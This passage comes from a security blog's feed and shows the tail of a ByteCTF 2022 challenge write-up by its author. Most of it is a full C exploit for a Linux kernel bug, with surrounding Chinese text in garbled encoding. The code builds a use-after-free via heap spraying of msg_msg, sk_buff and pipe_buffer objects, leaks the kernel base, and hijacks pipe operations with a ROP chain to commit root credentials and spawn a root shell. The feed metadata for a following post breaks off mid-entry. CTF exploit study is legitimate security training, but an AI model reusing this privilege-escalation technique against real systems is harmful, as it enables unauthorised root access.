class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         oob_socket[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br>    <span class="hljs-type">int</span>         dev_fd;<br>    <span class="hljs-type">int</span>         ret;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.0</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m\n[+] ByteCTF 2022 - ByteRun - exploit \033[0m\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m\n[*] Stage I - ROOT Privilege Escalation. \033[0m\n&quot;</span>);<br><br>    <span class="hljs-comment">/* basic resources alloc */</span><br>    saveStatus();<br><br>    <span class="hljs-keyword">if</span> ((dev_fd = open(<span class="hljs-string">&quot;/dev/bytedev&quot;</span>, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to open bytedev!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, oob_socket) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to create socket pair for OOB write!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* to run the exp on the specific core only */</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>    <br>    <span class="hljs-comment">/* socket pairs to spray sk_buff */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.I spray msg_msg for overlapping obj\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">/* build 4096 message queue */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">/* spray primary and secondary message */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br><br>        ret = writeMsg(msqid[i], <br>                    &amp;primary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(primary_msg), <br>                    PRIMARY_MSG_TYPE);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br>        &#125;<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br><br>        ret = writeMsg(msqid[i], <br>                    &amp;secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(secondary_msg), <br>                    SECONDARY_MSG_TYPE);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* create hole in primary msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="hljs-number">1024</span>) &#123;<br>        ret = readMsg(msqid[i], <br>                    &amp;primary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(primary_msg), <br>                    PRIMARY_MSG_TYPE);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to receive primary msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* triger off-by-null on primary msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);<br>    trigerOutOfBoundWrite(dev_fd, oob_socket);<br><br>    <span class="hljs-comment">/* find the queues that have the same secondary msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);<br>    victim_qid = real_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-comment">/* the hole */</span><br>        <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">256</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error qid: %d\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">0</span>] != MSG_TAG) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to make corruption!&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>] != i) &#123;<br>            victim_qid = i;<br>            real_qid = *(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to make overlapping!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d &quot;</span>, victim_qid);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, real_qid);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* free the victim secondary msg_msg, then we get a UAF */</span><br>    ret = readMsg(msqid[real_qid], <br>                &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <br>                SECONDARY_MSG_TYPE);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* spray sk_buff to construct fake msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_second_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    ret = spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* use fake msg_msg to read OOB */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    &#125;<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: &quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * release and re-spray sk_buff to construct fake msg_msg</span><br><span class="hljs-comment">     * so that we can make an arbitrary read on a primary msg_msg</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_second_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* cal the addr of UAF obj by the header we just read out */</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%lx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%lx\n&quot;</span>, <br>            victim_addr);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kbase\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* re-construct the msg_msg to fix it */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">XXX:</span> we need to pass the check in lib/list_debug.c </span><br><span class="hljs-comment">     * what we used to not to pass there is </span><br><span class="hljs-comment">     * &quot;prev-&gt;next == entry&quot; &amp;&amp; &quot;next-&gt;prev == entry&quot;</span><br><span class="hljs-comment">     * so a valid memory with [addr of entry] should be set there</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">memset</span>(fake_second_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_second_msg));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x50</span>; i++) &#123;<br>        ((<span class="hljs-type">size_t</span>*)(fake_second_msg))[i] = victim_addr;<br>    &#125;<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_second_msg, <br>            victim_addr + <span class="hljs-number">0x100</span>, victim_addr + <span class="hljs-number">0x100</span>,<br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* release UAF obj as secondary msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    ret = readMsg(msqid[victim_qid], <br>                &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <br>                VICTIM_MSG_TYPE);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* spray pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-comment">/* write something to activate the pipe */</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* release the sk_buff to read pipe_buffer, leak kernel base */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_second_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            ret = read(sk_sockets[i][<span class="hljs-number">1</span>], <br>                        &amp;fake_second_msg, <br>                        <span class="hljs-keyword">sizeof</span>(fake_second_msg));<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            &#125;<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops:\033[0m%lx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;</span>, kernel_offset);<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.V hijack the ops of pipe to root\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_second_msg;<br>    pipe_buf_ptr-&gt;ops = victim_addr;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) fake_second_msg;<br>    <span class="hljs-comment">/* push rsi ; pop rsp ; pop rbx ; pop r12 ; ret */</span><br>    ops_ptr-&gt;release = <span class="hljs-number">0xffffffff8133151b</span> + kernel_offset;<br>    <span class="hljs-comment">/* ret */</span><br>    ops_ptr-&gt;get = <span class="hljs-number">0xffffffff81331534</span> + kernel_offset;<br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_second_msg[<span class="hljs-number">0x20</span>];<br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = \<br>                    kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = (<span class="hljs-type">size_t</span>) getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_rflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-comment">//sleep(5);</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++) &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±äºå †å–·çš„ä¸ç¨³å®šæ€§ï¼Œåœ¨ç¬¬ä¸€é˜¶æ®µè¿˜æ˜¯æœ‰å¯èƒ½ä¼šæŒ‚æ‰çš„ï¼Œå› æ­¤è¿™é“é¢˜ç›®å…¶å®è¿˜æ˜¯éœ€è¦çˆ†ç ´çš„ä¸€é“é¢˜ç›®ï¼Œå‡ ç‡ 1/16ï¼š</p><p><img src="https://s2.loli.net/2022/09/30/skFd76cRPruwQip.jpg" alt="img.jpg"></p><h1>0x03.è§£é¢˜æƒ…å†µ</h1><p>è¿™é“é¢˜ç¬”è€…æœ€åˆå‡ºé¢˜çš„æ—¶å€™æ˜¯æŒ‰ç…§ç­¾åˆ°é¢˜çš„éš¾åº¦å‡ºçš„ï¼Œå› ä¸ºè¿™é“é¢˜çš„ä¸¤ä¸ªé˜¶æ®µï¼šé˜¶æ®µä¸€çš„ kernel UAF å…¶å®æ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨é€šè§£å®Œæˆè§£é¢˜çš„ï¼Œè€Œé˜¶æ®µäºŒçš„ QEMU é€ƒé€¸åˆ™æ˜¯ä¸€ä¸ªéå¸¸ç›´ç™½çš„è¶Šç•Œè¯»å†™æ¼æ´ï¼Œåˆ©ç”¨èµ·æ¥ä¹Ÿä¸ç®—å›°éš¾ã€‚</p><p>ä½†æœ€åå¹¶æ²¡æœ‰é˜Ÿä¼è§£å¼€è¿™é“é¢˜ï¼Œå¯èƒ½æ˜¯å› ä¸ºå¤§å®¶è§‰å¾—ç¬”è€…çš„é¢˜ç›®å¤ªç®€å•äº†éƒ½ä¸å±‘äºåšå§ï¼ˆç¬‘ï¼‰</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å‰å¹´ğŸ‘´å½“é€‰æ‰‹çš„æ—¶å€™è¿˜æœ‰â‘¤â­çº§çš„å¸¦ğŸ¨ä½ï¼Œä»Šå¹´å½“å‡ºé¢˜äººğŸ‘´åªèƒ½å–è¥¿åŒ—é£&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/tags/CTF/"/>
    
    <category term="Use After Free" scheme="http://blog.arttnba3.cn/tags/Use-After-Free/"/>
    
    <category term="ByteCTF" scheme="http://blog.arttnba3.cn/tags/ByteCTF/"/>
    
    <category term="Kernel UAF" scheme="http://blog.arttnba3.cn/tags/Kernel-UAF/"/>
    
    <category term="QEMU escape" scheme="http://blog.arttnba3.cn/tags/QEMU-escape/"/>
    
  </entry>
  
  <entry>
    <title>ã€HARDWARE.0x00ã€‘PCI è®¾å¤‡ç®€æ˜“é£Ÿç”¨æ‰‹å†Œ</title>
    <link href="http://blog.arttnba3.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/"/>
    <id>http://blog.arttnba3.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/</id>
    <published>2022-08-29T20:13:17.000Z</published>
    <updated>2023-04-12T17:18:59.303Z</updated>
    
